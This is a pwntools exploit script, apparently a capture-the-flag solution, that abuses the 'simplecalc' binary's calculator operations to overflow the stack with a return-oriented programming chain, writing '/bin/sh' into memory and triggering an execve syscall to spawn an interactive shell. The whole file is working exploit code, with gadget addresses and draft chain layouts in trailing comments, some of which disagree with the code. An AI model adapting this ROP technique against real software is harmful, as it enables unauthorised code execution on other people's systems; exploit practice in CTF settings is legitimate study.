from pwn import * 


gdbcmd = "b * 0x0000000000401588 "
#target = process("./simplecalc")
target = gdb.debug("./simplecalc", gdbscript = gdbcmd)

target.sendline(b"255")

for i in range(18):
	target.sendline("2")
	target.sendline("20000")
	
	target.sendline("20000")

target.sendline("1")
target.sendline("4200000")
target.sendline("1440") #0x00401be0 : xor eax, eax

target.sendline("2")
target.sendline("2000")
target.sendline("2000") #0x00000000

target.sendline("1")
target.sendline("4420000")
target.sendline("2277")  #0x00437a85 : pop rdx ; ret

target.sendline("2")
target.sendline("2000")
target.sendline("2000") #0x00000000

target.sendline("1")
target.sendline("1852000000")
target.sendline("400175") #0x6e69622f : /bin


target.sendline("1")
target.sendline("6840000")
target.sendline("5231")  #0x0068732f : /sh

target.sendline("1")
target.sendline("4200000")
target.sendline("1331")  #0x00401b73 : pop rdi ; ret 

target.sendline("2")
target.sendline("2000")
target.sendline("2000") #0x00000000

target.sendline("1")
target.sendline("7070000")
target.sendline("8401")  #0x006c0201 : bss_addr

target.sendline("2")
target.sendline("2000")
target.sendline("2000") #0x00000000

target.sendline("1")
target.sendline("4190000")
target.sendline("7050")  #0x00400aba mov qword ptr [rdi], rdx ; ret

target.sendline("2")
target.sendline("2000")
target.sendline("2000") #0x00000000

target.sendline("1")
target.sendline("4420000")
target.sendline("2313")  #0x00437aa9 : pop rdx ;  pop rsi ; ret 

target.sendline("2")
target.sendline("2000")
target.sendline("2000") #0x00000000 
target.sendline("2")
target.sendline("2000")
target.sendline("2000") #0x00000000

target.sendline("2")
target.sendline("2000")
target.sendline("2000") #0x00000000 
target.sendline("2")
target.sendline("2000")
target.sendline("2000") #0x00000000


target.sendline("2")
target.sendline("2000")
target.sendline("2000") #0x00000000
target.sendline("1")
target.sendline("4600000")
target.sendline("2768") #0x00463b90 add 1 to rax

target.sendline("2")
target.sendline("2000")
target.sendline("2000") #0x00000000
target.sendline("1")
target.sendline("4250000")
target.sendline("4703") #0x00000000 add 58 to rax


target.sendline("2")
target.sendline("2000")
target.sendline("2000") #0x00000000 

target.sendline("1")
target.sendline("4190000")
target.sendline("5464")  #0x00400488 syscall

target.sendline("5")

target.interactive()

# maybe not needed: xor eax, eax: 0x0000000000401be0
# zero out rdx and rax: 0x00000000|0048d053 
# add 1 to rax: 0x00000000|00463b90 
# add 58 to rax: 0x00000000|0040ebef 
# push rsi: 0x00000000|004adcc6 
# "/bin//sh" : 0x68732f2f|6e69622f
# null ptr: 0x00000000|00000000
# push rsp: 0x00000000|004131f4
# pop rdi: 0x00000000|00401b73
# System: 0x00000000|00400488


# zero out rdx and rax: 0x00000000|0048d053 
# add 1 to rax: 0x00000000|00463b90 
# add 58 to rax: 0x00000000|0040ebef 
# pop r14, r15:  0x00000000|00401b70
# bss/data addr: 0x00000000|006c2ca0
# "/bin//sh" : 0x68732f2f|6e69622f 
# pop rdi: 0x00000000|00401b73
# bss/data addr: 0x00000000|006c2ca0
# System: 0x00000000|00400488

# xor eax, eax: 0x0000000000401be0
#0x0000000000437a85 : pop rdx ; ret
# pop rdi: 0x00000000|00401b73
# "/bin//sh" : 0x68732f2f|6e69622f 
# bss/data addr: 0x00000000|006c2ca0
# 0x00000000|00400aba : mov qword ptr [rdi], rdx ; ret
# 0x00000000|00437a85 : pop rdx ; ret
# 0x0000: nullptr
# 0x00000000|00401c87 : pop rsi ; ret
# 0x0000: nullptr
# add 1 to rax: 0x00000000|00463b90 
# add 58 to rax: 0x00000000|0040ebef
# pop rdi: 0x00000000|00401b73
# bss/data addr: 0x00000000|006c2ca0
# System: 0x00000000|00400488